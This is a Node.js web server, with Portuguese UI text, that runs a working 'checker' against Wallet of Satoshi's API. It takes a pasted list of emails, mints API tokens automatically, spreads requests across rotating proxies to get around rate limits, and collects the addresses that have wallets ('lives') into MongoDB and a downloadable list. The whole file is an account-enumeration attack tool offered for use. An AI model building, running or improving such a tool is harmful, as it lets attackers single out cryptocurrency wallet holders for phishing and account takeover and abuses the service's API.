#!/usr/bin/env node
/**
 * wos-server.js — Wallet of Satoshi checker web
 * Cole a lista, veja o progresso em tempo real, copie os lives.
 *
 * npm install express undici mongodb
 * node wos-server.js [--port 3000] [--proxy 127.0.0.1:8080]
 */

'use strict';
require('dotenv').config();
const express  = require('express');
const { fetch, ProxyAgent } = require('undici');
const path     = require('path');
const fs       = require('fs');
const { MongoClient } = (() => { try { return require('mongodb'); } catch { return { MongoClient: null }; } })();

// ── config ────────────────────────────────────────────────────────────────────
const API   = 'https://www.livingroomofsatoshi.com';
const UA    = 'Mozilla/5.0 (Linux; Android 9; SM-G960F)';
const PORT  = parseInt(process.argv.find(a => a.startsWith('--port='))?.split('=')[1] || process.env.PORT || '3000');
const MONGO_URI = process.env.MONGODB_URI || process.env.MONGODB_URL || process.env.MONGO_URL || null;

const _DIR   = __dirname;
const TOKENS_FILE  = path.join(_DIR, 'tokens.txt');
const PROXIES_FILE = path.join(_DIR, 'proxies.txt');

function readLines(file) {
  try { return fs.readFileSync(file, 'utf-8').split('\n').map(s => s.trim()).filter(Boolean); }
  catch { return []; }
}

// ── estado global ─────────────────────────────────────────────────────────────
let job = null;

function makeJob(emails, tokens, proxyList) {
  return {
    queue:    [...emails],
    tokens,
    proxyList,
    done:     0,
    lives:    0,
    total:    emails.length,
    liveList: [],
    running:  true,
    stopped:  false,
  };
}

// ── SSE ───────────────────────────────────────────────────────────────────────
const sseClients = new Set();

function broadcast(type, data) {
  const msg = `data: ${JSON.stringify({ type, ...data })}\n\n`;
  for (const res of sseClients) {
    try { res.write(msg); } catch { sseClients.delete(res); }
  }
}

// ── MongoDB ───────────────────────────────────────────────────────────────────
let db = null;
async function initMongo() {
  if (!MONGO_URI || !MongoClient) return;
  try {
    const client = new MongoClient(MONGO_URI);
    await client.connect();
    db = client.db('wos');
    console.log('[mongo] conectado');
  } catch (e) {
    console.warn('[mongo] falhou:', e.message);
  }
}

async function saveLive(entry) {
  if (!db) return;
  try { await db.collection('lives').insertOne({ email: entry, ts: new Date() }); } catch {}
}

// ── token mint ────────────────────────────────────────────────────────────────
async function mintToken(dispatcher) {
  const r = await fetch(`${API}/api/v1/wallet/account`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'User-Agent': UA },
    body: JSON.stringify({ referrer: 'walletofsatoshi_v2' }),
    dispatcher,
  });
  if (!r.ok) throw new Error(`mint ${r.status}`);
  const j = await r.json();
  return j.apiToken;
}

// ── check email ───────────────────────────────────────────────────────────────
async function checkEmail(email, token, dispatcher, signal) {
  const r = await fetch(`${API}/api/v1/wallet/checkVerify?email=${encodeURIComponent(email)}`, {
    headers: { 'api-token': token, 'User-Agent': UA, 'Accept': 'application/json' },
    dispatcher,
    signal,
  });
  if (r.status === 429) return '429';
  if (!r.ok) return 'err';
  const j = await r.json();
  return j.hasWallet ? 'live' : 'bad';
}

// ── worker ────────────────────────────────────────────────────────────────────
async function worker(wid, j, dispatcher, ac, token) {
  while (j.running && j.queue.length > 0) {
    const email = j.queue.shift();
    if (!email) break;

    await new Promise(r => setTimeout(r, 400));

    let result;
    while (true) {
      try {
        result = await checkEmail(email, token, dispatcher, ac.signal);
        break;
      } catch (e) {
        if (e.name === 'AbortError') return;
        await new Promise(r => setTimeout(r, 5000));
      }
    }

    if (result === '429') {
      j.queue.unshift(email);
      await new Promise(r => setTimeout(r, 30000));
      continue;
    }

    j.done++;
    if (result === 'live') {
      j.lives++;
      j.liveList.push(email);
      saveLive(email);
      broadcast('live', { email });
    }

    broadcast('progress', { done: j.done, lives: j.lives, total: j.total, queue: j.queue.length });
  }
}

// ── proxy url ─────────────────────────────────────────────────────────────────
function proxyUrl(p) {
  if (!p || p.toLowerCase() === 'none') return null;
  return p.includes('://') ? p : `http://${p}`;
}

// ── start job ─────────────────────────────────────────────────────────────────
async function startJob(emails, tokens, proxies) {
  if (job?.running) stopJob();

  // proxies: usa passados ou carrega proxies.txt
  const proxyList = proxies.length > 0 ? proxies : readLines(PROXIES_FILE);
  const n = proxyList.length || 1;

  const dispatchers = proxyList.length > 0
    ? proxyList.map(p => { const u = proxyUrl(p); return u ? new ProxyAgent(u) : undefined; })
    : [undefined];

  // tokens: usa passados ou carrega tokens.txt; minta os que faltam
  let useTokens = tokens.length > 0 ? tokens : readLines(TOKENS_FILE);
  const need = Math.max(0, n - useTokens.length);
  if (need > 0) {
    broadcast('log', { msg: `Mintando ${need} token(s)...` });
    for (let i = 0; i < need; i++) {
      try {
        const t = await mintToken(dispatchers[useTokens.length % dispatchers.length]);
        useTokens.push(t);
        // salva em tokens.txt
        fs.writeFileSync(TOKENS_FILE, useTokens.join('\n') + '\n', 'utf-8');
        broadcast('log', { msg: `Token ${useTokens.length}/${n} ok` });
      } catch (e) {
        broadcast('log', { msg: `Erro mint: ${e.message}` });
      }
    }
  }
  if (useTokens.length === 0) { broadcast('log', { msg: 'Sem tokens — abortando' }); return; }

  job = makeJob(emails, useTokens, proxyList);
  const ac = new AbortController();
  job._ac = ac;

  broadcast('started', { total: job.total, threads: n });
  broadcast('log', { msg: `${n} threads  |  ${useTokens.length} tokens  |  ${proxyList.filter(Boolean).length} proxies` });

  const workers = [];
  for (let i = 0; i < n; i++) {
    workers.push(worker(i, job, dispatchers[i % dispatchers.length], ac, useTokens[i % useTokens.length]));
  }

  Promise.all(workers).then(() => {
    if (!job.stopped) {
      job.running = false;
      broadcast('done', { done: job.done, lives: job.lives, total: job.total });
    }
  });
}

function stopJob() {
  if (!job) return;
  job.running = false;
  job.stopped = true;
  try { job._ac?.abort(); } catch {}
  broadcast('stopped', { done: job.done, lives: job.lives });
}

// ── HTML ──────────────────────────────────────────────────────────────────────
function getHtml(defaultProxies, defaultTokens) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WOS Checker</title>
<style>
  :root {
    --bg:#0f0f13;--surface:#1a1a22;--border:#2a2a38;
    --accent:#7c6af7;--green:#3ecf8e;--red:#f87171;
    --text:#e2e2f0;--muted:#6b6b8a;
  }
  *{box-sizing:border-box;margin:0;padding:0;}
  body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;}
  .container{max-width:960px;margin:0 auto;padding:24px 16px;}
  h1{font-size:20px;font-weight:700;color:var(--accent);margin-bottom:4px;}
  .subtitle{color:var(--muted);font-size:12px;margin-bottom:24px;}
  .grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:16px;}
  @media(max-width:700px){.grid{grid-template-columns:1fr;}}
  label{display:block;font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;}
  textarea,input{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;color:var(--text);padding:10px 12px;font-size:12px;font-family:'Consolas',monospace;resize:vertical;outline:none;transition:border-color .15s;}
  textarea:focus,input:focus{border-color:var(--accent);}
  textarea{min-height:130px;}
  .row{display:flex;gap:10px;align-items:center;margin-bottom:16px;flex-wrap:wrap;}
  button{background:var(--accent);color:#fff;border:none;border-radius:8px;padding:10px 20px;cursor:pointer;font-size:13px;font-weight:600;transition:opacity .15s;white-space:nowrap;}
  button:hover{opacity:.85;}
  button.danger{background:var(--red);}
  button.ghost{background:var(--surface);border:1px solid var(--border);color:var(--text);}
  .progress-wrap{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:16px;}
  .stats{display:flex;gap:24px;margin-bottom:12px;flex-wrap:wrap;}
  .stat{text-align:center;}
  .stat-val{font-size:22px;font-weight:700;}
  .stat-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;}
  .bar-bg{background:var(--border);border-radius:4px;height:8px;overflow:hidden;}
  .bar-fill{background:var(--accent);height:100%;border-radius:4px;transition:width .3s;}
  .pct{font-size:11px;color:var(--muted);margin-top:4px;}
  .lives-wrap{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:16px;}
  .lives-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;}
  .lives-header h2{font-size:14px;color:var(--green);}
  .lives-list{font-family:'Consolas',monospace;font-size:12px;max-height:300px;overflow-y:auto;line-height:1.8;}
  .live-entry{color:var(--green);}
  .log-line{font-size:11px;color:var(--muted);margin-top:6px;}
  .badge{display:inline-block;background:var(--green);color:#000;border-radius:4px;padding:1px 6px;font-size:10px;font-weight:700;}
</style>
</head>
<body>
<div class="container">
  <h1>WOS Checker</h1>
  <p class="subtitle">Wallet of Satoshi — verificador de emails em tempo real</p>

  <div class="grid">
    <div>
      <label>Lista de emails (um por linha)</label>
      <textarea id="emails" placeholder="email1@gmail.com&#10;email2@hotmail.com&#10;..."></textarea>
    </div>
    <div>
      <label>Proxies (uma por linha — threads = proxies)</label>
      <textarea id="proxies" placeholder="http://user:pass@host:8080&#10;socks5://host:1080&#10;&#10;Vazio = usa proxies.txt">${defaultProxies}</textarea>
    </div>
    <div>
      <label>Tokens (opcional — minta automático se vazio)</label>
      <textarea id="tokens" placeholder="token1&#10;token2&#10;&#10;Vazio = usa tokens.txt">${defaultTokens}</textarea>
    </div>
  </div>

  <div class="row">
    <button id="btnStart" onclick="startJob()">▶ Iniciar</button>
    <button class="danger" id="btnStop" onclick="stopJob()" style="display:none">■ Parar</button>
    <button class="ghost" onclick="reloadFiles()">↺ Recarregar arquivos</button>
  </div>

  <div class="progress-wrap" id="progressWrap" style="display:none">
    <div class="stats">
      <div class="stat"><div class="stat-val" id="sDone">0</div><div class="stat-lbl">Checados</div></div>
      <div class="stat"><div class="stat-val" style="color:var(--green)" id="sLives">0</div><div class="stat-lbl">Lives</div></div>
      <div class="stat"><div class="stat-val" id="sTotal">0</div><div class="stat-lbl">Total</div></div>
      <div class="stat"><div class="stat-val" id="sQueue">0</div><div class="stat-lbl">Fila</div></div>
      <div class="stat"><div class="stat-val" id="sRps">0</div><div class="stat-lbl">e/s</div></div>
      <div class="stat"><div class="stat-val" id="sThreads">0</div><div class="stat-lbl">Threads</div></div>
    </div>
    <div class="bar-bg"><div class="bar-fill" id="barFill" style="width:0%"></div></div>
    <div class="pct" id="pct">0%</div>
    <div class="log-line" id="logLine"></div>
  </div>

  <div class="lives-wrap">
    <div class="lives-header">
      <h2>Lives <span class="badge" id="liveBadge">0</span></h2>
      <div style="display:flex;gap:8px">
        <button class="ghost" onclick="copyLives()">Copiar</button>
        <button class="ghost" onclick="downloadLives()">Download</button>
      </div>
    </div>
    <div class="lives-list" id="livesList"></div>
  </div>
</div>

<script>
let es=null, lives=[], startTs=null;

function startJob(){
  const emails  = document.getElementById('emails').value.trim().split('\\n').map(s=>s.trim()).filter(Boolean);
  const proxies = document.getElementById('proxies').value.trim().split('\\n').map(s=>s.trim()).filter(Boolean);
  const tokens  = document.getElementById('tokens').value.trim().split('\\n').map(s=>s.trim()).filter(Boolean);
  if(!emails.length){alert('Cole a lista de emails');return;}
  lives=[];startTs=Date.now();
  document.getElementById('livesList').innerHTML='';
  document.getElementById('liveBadge').textContent='0';
  document.getElementById('progressWrap').style.display='block';
  document.getElementById('btnStart').style.display='none';
  document.getElementById('btnStop').style.display='';
  fetch('/api/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({emails,proxies,tokens})});
  if(es)es.close();
  es=new EventSource('/api/stream');
  es.onmessage=({data})=>{
    const d=JSON.parse(data);
    if(d.type==='progress'){
      document.getElementById('sDone').textContent=d.done.toLocaleString();
      document.getElementById('sLives').textContent=d.lives;
      document.getElementById('sTotal').textContent=d.total.toLocaleString();
      document.getElementById('sQueue').textContent=d.queue.toLocaleString();
      const pct=d.total?(d.done/d.total*100).toFixed(1):0;
      document.getElementById('barFill').style.width=pct+'%';
      document.getElementById('pct').textContent=pct+'%';
      document.getElementById('sRps').textContent=startTs?(d.done/((Date.now()-startTs)/1000)).toFixed(1):0;
    }else if(d.type==='started'){
      document.getElementById('sThreads').textContent=d.threads||0;
    }else if(d.type==='live'){
      lives.push(d.email);
      document.getElementById('liveBadge').textContent=lives.length;
      const el=document.createElement('div');
      el.className='live-entry';el.textContent=d.email;
      const list=document.getElementById('livesList');
      list.appendChild(el);list.scrollTop=list.scrollHeight;
    }else if(d.type==='log'){
      document.getElementById('logLine').textContent=d.msg;
    }else if(d.type==='done'||d.type==='stopped'){
      document.getElementById('logLine').textContent=d.type==='done'?'✅ Concluído':'⏹ Parado';
      document.getElementById('btnStart').style.display='';
      document.getElementById('btnStop').style.display='none';
      es.close();
    }
  };
}

function stopJob(){
  fetch('/api/stop',{method:'POST'});
  document.getElementById('btnStart').style.display='';
  document.getElementById('btnStop').style.display='none';
}

function copyLives(){navigator.clipboard.writeText(lives.join('\\n')).then(()=>alert('Copiado! '+lives.length+' lives'));}
function downloadLives(){const a=document.createElement('a');a.href='/api/download';a.download='lives.txt';a.click();}
function reloadFiles(){location.reload();}
</script>
</body>
</html>`;
}

// ── servidor ──────────────────────────────────────────────────────────────────
const app = express();
app.use(express.json({ limit: '50mb' }));

app.get('/', (_, res) => {
  const proxies = readLines(PROXIES_FILE).join('\n');
  const tokens  = readLines(TOKENS_FILE).join('\n');
  res.send(getHtml(proxies, tokens));
});

app.post('/api/start', async (req, res) => {
  const { emails, tokens = [], proxies = [] } = req.body;
  res.json({ ok: true });
  startJob(emails, tokens, proxies);
});

app.post('/api/stop', (_, res) => { stopJob(); res.json({ ok: true }); });

app.get('/api/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();
  sseClients.add(res);
  req.on('close', () => sseClients.delete(res));
  if (job?.running) {
    res.write(`data: ${JSON.stringify({ type: 'started', total: job.total, threads: job.proxyList?.length || 1 })}\n\n`);
    res.write(`data: ${JSON.stringify({ type: 'progress', done: job.done, lives: job.lives, total: job.total, queue: job.queue.length })}\n\n`);
    for (const e of job.liveList) res.write(`data: ${JSON.stringify({ type: 'live', email: e })}\n\n`);
  }
});

app.get('/api/lives',    (_, res) => res.json({ lives: job?.liveList || [] }));
app.get('/api/download', (_, res) => {
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Disposition', 'attachment; filename="lives.txt"');
  res.send((job?.liveList || []).join('\n'));
});
app.get('/api/status',   (_, res) => {
  if (!job) return res.json({ running: false });
  res.json({ running: job.running, done: job.done, lives: job.lives, total: job.total });
});

initMongo().then(() => {
  app.listen(PORT, () => {
    console.log(`[wos-server] http://localhost:${PORT}  mongo:${db ? 'sim' : 'não'}`);
  });
});
